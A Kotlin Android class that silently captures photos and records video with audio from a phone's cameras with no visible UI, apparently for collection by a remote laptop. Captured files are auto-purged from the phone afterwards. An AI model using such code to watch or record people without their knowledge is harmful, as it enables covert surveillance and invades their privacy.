package com.operator.companion.service

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.operator.companion.diagnostics.RemoteDiagnosticManager
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream

class BackgroundCameraService(private val context: Context) {
    private val TAG = "BgCameraService"
    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

    companion object {
        /** Completed to stop the running recording ("record until I stop", or stopping a timed one early). */
        @Volatile private var stopSignal: CompletableDeferred<Unit>? = null

        fun requestStopRecording(): Boolean {
            val s = stopSignal ?: return false
            return s.complete(Unit)
        }

        /** Completed with "front"/"back" to move the running recording to the other camera. */
        @Volatile private var switchSignal: CompletableDeferred<String>? = null
        @Volatile private var recordingLens: String? = null

        /** Switch the running recording to [lens]: the current clip is closed and a new one starts on that
         *  camera; the laptop joins the clips. Returns false when nothing is recording. */
        fun requestSwitchLens(lens: String): Boolean {
            val want = if (lens.lowercase() == "front") "front" else "back"
            val s = switchSignal ?: return false
            if (want == recordingLens) return true
            return s.complete(want)
        }

        private var sharedThread: HandlerThread? = null
        private var sharedHandler: Handler? = null

        @Synchronized
        fun getCameraHandler(): Handler {
            if (sharedThread == null || !sharedThread!!.isAlive) {
                sharedThread = HandlerThread("BgCameraSharedThread").apply { start() }
                sharedHandler = Handler(sharedThread!!.looper)
            }
            return sharedHandler!!
        }
    }

    /**
     * Cross-OEM camera ID resolution supporting Samsung, Pixel, Xiaomi, Realme, Oppo, Motorola, OnePlus.
     * Evaluates hardware level to select the most reliable primary sensor for the requested lens facing.
     */
    private fun getCameraId(lensFacing: Int): String? {
        val candidates = mutableListOf<Pair<String, Int>>()

        try {
            for (id in cameraManager.cameraIdList) {
                try {
                    val characteristics = cameraManager.getCameraCharacteristics(id)
                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                    val hwLevel = characteristics.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL)
                        ?: CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY

                    if (facing == lensFacing) {
                        // Priority: LEVEL_3 (3) > FULL (1) > LIMITED (0) > LEGACY (2)
                        val rank = when (hwLevel) {
                            CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_3 -> 4
                            CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL -> 3
                            CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED -> 2
                            else -> 1
                        }
                        candidates.add(id to rank)
                    }
                } catch (e: Exception) {
                    // Ignore vendor-specific camera ID query errors
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error querying camera IDs: ${e.message}")
        }

        if (candidates.isNotEmpty()) {
            return candidates.maxByOrNull { it.second }?.first
        }

        // Fallbacks for unusual OEM HAL mappings
        val idList = try { cameraManager.cameraIdList } catch (e: Exception) { emptyArray<String>() }
        if (lensFacing == CameraCharacteristics.LENS_FACING_FRONT) {
            if (idList.contains("1")) return "1"
        } else {
            if (idList.contains("0")) return "0"
        }
        return idList.firstOrNull()
    }

    /**
     * Captures a still photo directly from the camera sensor in the background without opening any UI.
     */
    @SuppressLint("MissingPermission")
    fun capturePhoto(
        lens: String = "back",
        onComplete: (success: Boolean, filePath: String?, base64Data: String?, error: String?) -> Unit
    ) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            val err = "CAMERA permission not granted on device"
            Log.e(TAG, err)
            RemoteDiagnosticManager.reportError(
                source = "camera_hardware",
                operation = "capture_photo",
                errorCode = "CAMERA_PERMISSION_DENIED",
                description = err,
                suggestion = "Grant Camera permission in Android App Info settings."
            )
            onComplete(false, null, null, err)
            return
        }

        val targetFacing = if (lens.lowercase() == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }

        val cameraId = getCameraId(targetFacing) ?: run {
            val err = "No camera hardware found for lens: $lens"
            RemoteDiagnosticManager.reportError(
                source = "camera_hardware",
                operation = "capture_photo",
                errorCode = "CAMERA_NOT_FOUND",
                description = err,
                suggestion = "Verify if device possesses the requested camera sensor or try the opposite lens."
            )
            onComplete(false, null, null, err)
            return
        }

        val cameraHandler = getCameraHandler()

        try {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: arrayOf()
            val chosenSize = jpegSizes.firstOrNull { it.width <= 1920 && it.height <= 1080 }
                ?: jpegSizes.firstOrNull()
                ?: Size(1280, 720)

            val imageReader = ImageReader.newInstance(chosenSize.width, chosenSize.height, ImageFormat.JPEG, 2)
            var cameraDevice: CameraDevice? = null
            var captureSession: CameraCaptureSession? = null
            // A tiny preview surface the sensor streams to while auto-exposure/focus ramp up.
            // Without it, the very first still off a just-opened sensor is BLACK on many OEMs
            // (Vivo, MediaTek, Samsung …); only some HALs (e.g. Qualcomm/Realme) tolerate an instant grab.
            val previewTexture = android.graphics.SurfaceTexture(0).apply { setDefaultBufferSize(640, 480) }
            val previewSurface = android.view.Surface(previewTexture)
            fun releasePreview() {
                try { previewSurface.release() } catch (_: Exception) {}
                try { previewTexture.release() } catch (_: Exception) {}
            }

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        // Save JPEG to /sdcard/Download
                        val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                        if (!downloadDir.exists()) downloadDir.mkdirs()
                        val fileName = "capture_silent_${System.currentTimeMillis()}.jpg"
                        val outputFile = File(downloadDir, fileName)
                        FileOutputStream(outputFile).use { fos ->
                            fos.write(bytes)
                        }

                        val base64Data = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        Log.d(TAG, "Photo captured successfully: ${outputFile.absolutePath} (${bytes.size} bytes)")
                        onComplete(true, outputFile.absolutePath, base64Data, null)

                        // Watchdog: Purge temporary photo from phone storage after 25s grace period
                        CoroutineScope(Dispatchers.IO).launch {
                            delay(25_000L)
                            try {
                                if (outputFile.exists()) {
                                    outputFile.delete()
                                    Log.d(TAG, "Purged temporary photo from phone storage: ${outputFile.name}")
                                }
                            } catch (e: Exception) {
                                // Ignored
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error saving photo file", e)
                        RemoteDiagnosticManager.reportError(
                            source = "camera_hardware",
                            operation = "save_photo_file",
                            errorCode = "STORAGE_WRITE_FAILED",
                            description = e.message ?: "Failed to write photo to storage",
                            suggestion = "Check available internal storage space and write permissions.",
                            throwable = e
                        )
                        onComplete(false, null, null, e.message)
                    } finally {
                        try {
                            captureSession?.close()
                            cameraDevice?.close()
                            imageReader.close()
                            releasePreview()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error closing camera resources", e)
                        }
                    }
                }
            }, cameraHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    // Preview surface first so the sensor streams and 3A converges before the still.
                    val surfaces = listOf(previewSurface, imageReader.surface)

                    val sessionCallback = object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            try {
                                var captured = false
                                fun fireStill() {
                                    if (captured) return
                                    captured = true
                                    try {
                                        try { session.stopRepeating() } catch (_: Exception) {}
                                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                            addTarget(imageReader.surface)
                                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                        }
                                        session.capture(captureBuilder.build(), null, cameraHandler)
                                        Log.d(TAG, "Still capture dispatched after sensor warm-up")
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to capture still image request", e)
                                        RemoteDiagnosticManager.reportError(
                                            source = "camera_hardware",
                                            operation = "session_capture",
                                            errorCode = "STILL_CAPTURE_DISPATCH_FAILED",
                                            description = e.message ?: "Failed to dispatch capture request",
                                            suggestion = "Sensor might have been disconnected or interrupted.",
                                            throwable = e
                                        )
                                        onComplete(false, null, null, e.message)
                                        camera.close()
                                    }
                                }

                                // Stream preview frames; grab the still once auto-exposure has converged
                                // (or after enough warm-up frames when the HAL doesn't report AE state).
                                var frames = 0
                                val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                    addTarget(previewSurface)
                                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                }
                                val warmup = object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                        if (captured) return
                                        frames++
                                        val ae = result.get(CaptureResult.CONTROL_AE_STATE)
                                        val aeReady = ae == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
                                            ae == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED ||
                                            ae == CaptureResult.CONTROL_AE_STATE_LOCKED
                                        // AE converged → 2 extra frames; AE unknown → ~12 frames (~0.4s) as a floor
                                        if ((aeReady && frames >= 3) || (ae == null && frames >= 12) || frames >= 45) fireStill()
                                    }
                                }
                                session.setRepeatingRequest(previewRequest.build(), warmup, cameraHandler)
                                // Hard ceiling so a sensor that never reports convergence still returns an image
                                cameraHandler.postDelayed({ fireStill() }, 2500L)
                            } catch (e: Exception) {
                                Log.e(TAG, "Failed to start camera warm-up", e)
                                RemoteDiagnosticManager.reportError(
                                    source = "camera_hardware",
                                    operation = "session_capture",
                                    errorCode = "STILL_CAPTURE_DISPATCH_FAILED",
                                    description = e.message ?: "Failed to dispatch capture request",
                                    suggestion = "Sensor might have been disconnected or interrupted.",
                                    throwable = e
                                )
                                onComplete(false, null, null, e.message)
                                camera.close()
                            }
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            val err = "CameraCaptureSession configuration failed"
                            Log.e(TAG, err)
                            RemoteDiagnosticManager.reportError(
                                source = "camera_hardware",
                                operation = "create_capture_session",
                                errorCode = "SESSION_CONFIG_FAILED",
                                description = err,
                                suggestion = "Verify output surface resolution compatibility."
                            )
                            onComplete(false, null, null, err)
                            try { imageReader.close() } catch (_: Exception) {}
                            releasePreview()
                            camera.close()
                        }
                    }

                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            val outputConfigs = surfaces.map { OutputConfiguration(it) }
                            val sessionConfig = SessionConfiguration(
                                SessionConfiguration.SESSION_REGULAR,
                                outputConfigs,
                                ContextCompat.getMainExecutor(context),
                                sessionCallback
                            )
                            camera.createCaptureSession(sessionConfig)
                        } else {
                            @Suppress("DEPRECATION")
                            camera.createCaptureSession(surfaces, sessionCallback, cameraHandler)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to create camera capture session", e)
                        onComplete(false, null, null, e.message)
                        camera.close()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "CameraDevice disconnected")
                    camera.close()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    val errorDesc = when (error) {
                        ERROR_CAMERA_IN_USE -> "Camera device is already in use by another application"
                        ERROR_MAX_CAMERAS_IN_USE -> "Maximum number of camera devices are in use"
                        ERROR_CAMERA_DISABLED -> "Camera device could not be opened due to device policy code"
                        ERROR_CAMERA_DEVICE -> "Camera device encountered a fatal hardware error"
                        ERROR_CAMERA_SERVICE -> "Camera service encountered a fatal error"
                        else -> "Camera error code: $error"
                    }
                    Log.e(TAG, "CameraDevice open error: $errorDesc ($error)")
                    RemoteDiagnosticManager.reportError(
                        source = "camera_hardware",
                        operation = "open_camera",
                        errorCode = "CAMERA_DEVICE_ERROR_$error",
                        description = errorDesc,
                        suggestion = "Ensure screen is not in deep sleep, restart camera service, or close background apps using camera."
                    )
                    onComplete(false, null, null, errorDesc)
                    try { imageReader.close() } catch (_: Exception) {}
                    releasePreview()
                    camera.close()
                }
            }, cameraHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Error initiating background camera capture", e)
            RemoteDiagnosticManager.reportError(
                source = "camera_hardware",
                operation = "capture_photo_init",
                errorCode = "CAPTURE_INIT_FAILED",
                description = e.message ?: "Failed to initiate photo capture",
                suggestion = "Check device camera HAL status.",
                throwable = e
            )
            onComplete(false, null, null, e.message)
        }
    }

    /**
     * Records a video clip directly from the camera sensor in the background without opening any UI.
     * Includes automated fallback for audio-busy conditions to guarantee video capture success.
     */
    @SuppressLint("MissingPermission")
    fun recordVideo(
        lens: String = "back",
        durationSeconds: Int = 5,
        onComplete: (success: Boolean, filePath: String?, error: String?) -> Unit
    ) = recordSegment(lens, durationSeconds, mutableListOf(), 0L, onComplete)

    /**
     * One clip of a recording. A lens switch closes this clip and starts the next on the other camera;
     * [parts] collects the clip paths. The final "<first clip>.done" marker lists every clip (one per line)
     * so the laptop can join them; the callback reports the first clip's path.
     */
    @SuppressLint("MissingPermission")
    private fun recordSegment(
        lens: String,
        durationSeconds: Int,
        parts: MutableList<String>,
        deadlineAt: Long,           // 0 = not started yet (computed when the first clip starts)
        onComplete: (success: Boolean, filePath: String?, error: String?) -> Unit
    ) {
        // A later clip failing must not lose the earlier ones: finish with what was recorded
        val finishWith: (Boolean, String?, String?) -> Unit = { ok, path, err ->
            if (!ok && parts.isNotEmpty()) finalizeParts(parts, onComplete) else onComplete(ok, path, err)
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            val err = "CAMERA permission not granted"
            RemoteDiagnosticManager.reportError(
                source = "camera_hardware",
                operation = "record_video",
                errorCode = "CAMERA_PERMISSION_DENIED",
                description = err,
                suggestion = "Grant Camera permission in Android settings."
            )
            finishWith(false, null, err)
            return
        }

        val targetFacing = if (lens.lowercase() == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }

        val cameraId = getCameraId(targetFacing) ?: run {
            val err = "No camera found for lens $lens"
            finishWith(false, null, err)
            return
        }

        val cameraHandler = getCameraHandler()

        val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        if (!downloadDir.exists()) downloadDir.mkdirs()
        val fileName = if (parts.isEmpty()) "video_silent_${System.currentTimeMillis()}.mp4"
                       else "part_${System.currentTimeMillis()}_${parts.size}.mp4"   // not matched by the laptop's marker glob
        val outputFile = File(downloadDir, fileName)

        val characteristics = cameraManager.getCameraCharacteristics(cameraId)
        val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val videoSizes = map?.getOutputSizes(MediaRecorder::class.java) ?: arrayOf()
        val chosenSize = videoSizes.firstOrNull { it.width == 1280 && it.height == 720 }
            ?: videoSizes.firstOrNull { it.width <= 1280 && it.height <= 720 }
            ?: videoSizes.firstOrNull()
            ?: Size(1280, 720)

        fun createRecorder(): MediaRecorder {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
        }

        var mediaRecorder = createRecorder()
        var hasAudio = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

        // Attempt preparation with audio first, fallback to video-only if audio source is busy
        var prepareSuccess = false
        try {
            if (hasAudio) {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            }
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mediaRecorder.setOutputFile(outputFile.absolutePath)
            mediaRecorder.setVideoEncodingBitRate(4_000_000)
            mediaRecorder.setVideoFrameRate(30)
            mediaRecorder.setVideoSize(chosenSize.width, chosenSize.height)
            mediaRecorder.setOrientationHint(sensorOrientation)
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            if (hasAudio) {
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            }
            mediaRecorder.prepare()
            prepareSuccess = true
        } catch (e: Exception) {
            Log.w(TAG, "MediaRecorder prepare failed with audio: ${e.message}. Retrying in video-only mode...")
            try {
                mediaRecorder.reset()
                mediaRecorder.release()
            } catch (ignored: Exception) {}

            // Retry video-only without audio
            try {
                mediaRecorder = createRecorder()
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                mediaRecorder.setOutputFile(outputFile.absolutePath)
                mediaRecorder.setVideoEncodingBitRate(4_000_000)
                mediaRecorder.setVideoFrameRate(30)
                mediaRecorder.setVideoSize(chosenSize.width, chosenSize.height)
                mediaRecorder.setOrientationHint(sensorOrientation)
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                mediaRecorder.prepare()
                prepareSuccess = true
                Log.d(TAG, "MediaRecorder prepared successfully in video-only mode")
            } catch (e2: Exception) {
                Log.e(TAG, "Failed to prepare MediaRecorder even in video-only mode", e2)
                RemoteDiagnosticManager.reportError(
                    source = "camera_hardware",
                    operation = "media_recorder_prepare",
                    errorCode = "RECORDER_PREPARE_FAILED",
                    description = e2.message ?: "MediaRecorder prepare failed",
                    suggestion = "Verify encoder support for H.264 720p or check storage access.",
                    throwable = e2
                )
                finishWith(false, null, "MediaRecorder prepare failed: ${e2.message}")
                return
            }
        }

        if (!prepareSuccess) return

        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                val surfaces = listOf(mediaRecorder.surface)

                val sessionCallback = object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            val recordRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                addTarget(mediaRecorder.surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                            }
                            session.setRepeatingRequest(recordRequest.build(), null, cameraHandler)
                            // Let the sensor stream for ~600 ms so auto-exposure ramps up before recording;
                            // otherwise the clip starts black on Vivo/MediaTek/Samsung HALs (same cause as
                            // the black still). Scheduled, not slept, so the callback thread never blocks.
                            cameraHandler.postDelayed({
                              try {
                            mediaRecorder.start()
                            Log.d(TAG, "Background video recording started for $durationSeconds s ($lens camera, clip ${parts.size + 1})")

                            CoroutineScope(Dispatchers.IO).launch {
                                // durationSeconds <= 0: record until a stop request arrives
                                val stop = stopSignal?.takeIf { parts.isNotEmpty() && !it.isCompleted } ?: CompletableDeferred<Unit>()
                                stopSignal = stop
                                val switch = CompletableDeferred<String>()
                                switchSignal = switch; recordingLens = if (lens.lowercase() == "front") "front" else "back"
                                val deadline = when {
                                    deadlineAt > 0 -> deadlineAt
                                    durationSeconds > 0 -> System.currentTimeMillis() + durationSeconds * 1000L
                                    else -> Long.MAX_VALUE
                                }
                                while (!stop.isCompleted && !switch.isCompleted && System.currentTimeMillis() < deadline) {
                                    withTimeoutOrNull((deadline - System.currentTimeMillis()).coerceIn(1L, 2000L)) {
                                        kotlinx.coroutines.selects.select<Unit> { stop.onAwait { }; switch.onAwait { } }
                                    }
                                    if ((outputFile.parentFile?.usableSpace ?: Long.MAX_VALUE) < 300L * 1024 * 1024) {
                                        Log.w(TAG, "Phone storage almost full: stopping the recording")
                                        break
                                    }
                                }
                                val nextLens = if (switch.isCompleted && !stop.isCompleted && System.currentTimeMillis() < deadline)
                                    switch.getCompleted() else null
                                if (switchSignal === switch) { switchSignal = null; recordingLens = null }
                                if (nextLens == null && stopSignal === stop) stopSignal = null
                                try {
                                    runCatching { mediaRecorder.stop() }.onFailure { if (parts.isEmpty() && nextLens == null) throw it }
                                    mediaRecorder.reset()
                                    mediaRecorder.release()
                                    session.close()
                                    camera.close()
                                    if (outputFile.length() > 0) parts.add(outputFile.absolutePath) else outputFile.delete()
                                    Log.d(TAG, "Video clip saved: ${outputFile.absolutePath}")
                                    if (nextLens != null) {
                                        // Camera switch: continue on the other sensor once this one is released
                                        delay(300)
                                        recordSegment(nextLens, durationSeconds, parts, deadline, onComplete)
                                    } else {
                                        finalizeParts(parts, onComplete)
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error finalizing MediaRecorder", e)
                                    RemoteDiagnosticManager.reportError(
                                        source = "camera_hardware",
                                        operation = "finalize_video_recording",
                                        errorCode = "RECORDER_FINALIZE_ERROR",
                                        description = e.message ?: "Error stopping/saving video recording",
                                        suggestion = "Check if video was too short (<1s) or storage was exhausted.",
                                        throwable = e
                                    )
                                    finishWith(false, null, e.message)
                                    camera.close()
                                }
                            }
                              } catch (e: Exception) {
                                  Log.e(TAG, "Error starting recording after warm-up", e)
                                  finishWith(false, null, e.message)
                                  try { camera.close() } catch (_: Exception) {}
                              }
                            }, 600L)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error starting background video recording", e)
                            finishWith(false, null, e.message)
                            camera.close()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        val err = "Video capture session configuration failed"
                        Log.e(TAG, err)
                        RemoteDiagnosticManager.reportError(
                            source = "camera_hardware",
                            operation = "create_video_session",
                            errorCode = "VIDEO_SESSION_CONFIG_FAILED",
                            description = err,
                            suggestion = "Surface resolution may not be supported by camera HAL."
                        )
                        finishWith(false, null, err)
                        camera.close()
                    }
                }

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        val outputConfigs = surfaces.map { OutputConfiguration(it) }
                        val sessionConfig = SessionConfiguration(
                            SessionConfiguration.SESSION_REGULAR,
                            outputConfigs,
                            ContextCompat.getMainExecutor(context),
                            sessionCallback
                        )
                        camera.createCaptureSession(sessionConfig)
                    } else {
                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(surfaces, sessionCallback, cameraHandler)
                    }
                } catch (e: Exception) {
                    finishWith(false, null, e.message)
                    camera.close()
                }
            }

            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
            }

            override fun onError(camera: CameraDevice, error: Int) {
                val err = "Camera open error during video recording: $error"
                Log.e(TAG, err)
                RemoteDiagnosticManager.reportError(
                    source = "camera_hardware",
                    operation = "open_camera_for_video",
                    errorCode = "VIDEO_CAMERA_OPEN_ERROR_$error",
                    description = err,
                    suggestion = "Check if camera is held by another process or locked by device policy."
                )
                finishWith(false, null, err)
                camera.close()
            }
        }, cameraHandler)
    }

    /** Marks the recording complete: "<first clip>.done" lists every clip, then purges them later if never collected. */
    private fun finalizeParts(parts: List<String>, onComplete: (Boolean, String?, String?) -> Unit) {
        if (parts.isEmpty()) { onComplete(false, null, "Nothing was recorded"); return }
        val first = File(parts[0])
        // Marker for the laptop (USB path): the files are complete and safe to copy
        runCatching { File(first.absolutePath + ".done").writeText(parts.joinToString("\n")) }
        onComplete(true, first.absolutePath, null)
        CoroutineScope(Dispatchers.IO).launch {
            // Watchdog: purge the temporary video if the laptop never collected it.
            // Long recordings take longer to copy (especially over the internet).
            val total = parts.sumOf { File(it).length() }
            delay(maxOf(25_000L, total / (256 * 1024) * 1000L).coerceAtMost(3_600_000L))
            File(first.absolutePath + ".done").delete()
            parts.forEach { p -> File(p).takeIf { it.exists() }?.let { it.delete(); Log.d(TAG, "Purged temporary video: ${it.name}") } }
        }
    }
}
